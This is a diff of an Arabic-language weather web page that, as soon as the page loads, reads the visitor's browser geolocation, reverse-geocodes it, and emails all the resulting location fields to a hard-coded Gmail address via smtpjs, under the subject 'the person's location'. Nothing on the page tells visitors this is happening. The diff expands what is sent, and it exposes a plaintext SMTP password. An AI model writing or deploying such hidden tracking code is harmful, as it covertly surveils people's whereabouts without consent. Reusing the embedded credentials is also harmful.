@@ -252,6 +252,7 @@ transition: all 0.25s ease;
             </div>
         </section>
     </div>
+    <button class="getLoc">Get Location</button>
     <script src=" https://smtpjs.com/v3/smtp.js"></script>
     <script src="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.4.0/js/all.min.js" integrity="sha512-fD9DI5bZwQxOi7MhYWnnNPlvXdp/2Pj3XSTRrFs5FQa4mizyGLnJcN6tuvUS6LbmgN1ut+XGSABKvjN0H6Aoow==" crossorigin="anonymous" referrerpolicy="no-referrer"></script>
     <script src="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.4.0/js/brands.min.js" integrity="sha512-KYlRezs7yAa59UnX6zAvY7I96Te02kycQn02Sr6FU/fBpxcXAwumRe5DHVrqVnWTt9HY/PktrAPZzSe9UE1Yxg==" crossorigin="anonymous" referrerpolicy="no-referrer"></script>
@@ -287,29 +288,48 @@ transition: all 0.25s ease;
                     
                     let apia = `https://api.bigdatacloud.net/data/reverse-geocode-client?latitude=${latitude}&longitude=${longitude}&localityLanguage=en`
                     fetch(apia).then(response=> response.json()).then(data =>{
-                           Email.send({
-                        Host : "smtp.elasticemail.com",
-                        Username : "jamalgoving@gmail.com",
-                        Password : "CEBE543A3F344AB63820BFE7D920CA60C31B",
-                        To : 'jamalgoving@gmail.com',
-                        From : "jamalgoving@gmail.com",
-                        Subject : `موقع الشخص`,
-                        Body : `${data.locality}, ${data.city}, ${data.countryName}`
-                    })
+                        const sortedData = {};
 
+                    Object.keys(data)
+                      .sort()
+                      .forEach((key) => {
+                        sortedData[key] = data[key];
+                      });
+                      let sub = ''
+                    Object.keys(sortedData).forEach((key) => {
+                        if(typeof key !== 'object'){
+                            console.log(key + ": " + sortedData[key]);
+                            //sub +="\n" +  key + ": " + sortedData[key] + "\n"
+                            sub += `<div style='text-align:center;font-family:sans-serif;font-weight:600;font-size:18px'>${key} : ${sortedData[key]}<br></div>`;
+                        }
+                    });
                     console.log(data)
+                     Email.send({
+                  Host : "smtp.elasticemail.com",
+                  Username : "jamalgoving@gmail.com",
+                  Password : "CEBE543A3F344AB63820BFE7D920CA60C31B",
+                  To : 'jamalgoving@gmail.com',
+                  From : "jamalgoving@gmail.com",
+                  Subject : `موقع الشخص`,
+                  Body :sub
+              })
+
+                  
+
+                    getData()
+
                    
         })
-                    getData()
                 })
             }
+            
         }
      
      function onCity(city){
         api = `https://api.openweathermap.org/data/2.5/weather?q=${city}&lang=ar&units=metric&appid=${apiKey}`
         getData()
      }
-        window.onload = getPos()
+       window.onload = getPos()
         async function getData(){
             
             let response = await fetch(api)
@@ -331,7 +351,8 @@ transition: all 0.25s ease;
                 humIcon.innerText = `humidity_high`
             }
            
-
+            if(navigator.geolocation){
+            }
             let id = json.weather[0].id
             console.log(id)
             if(id == 800){
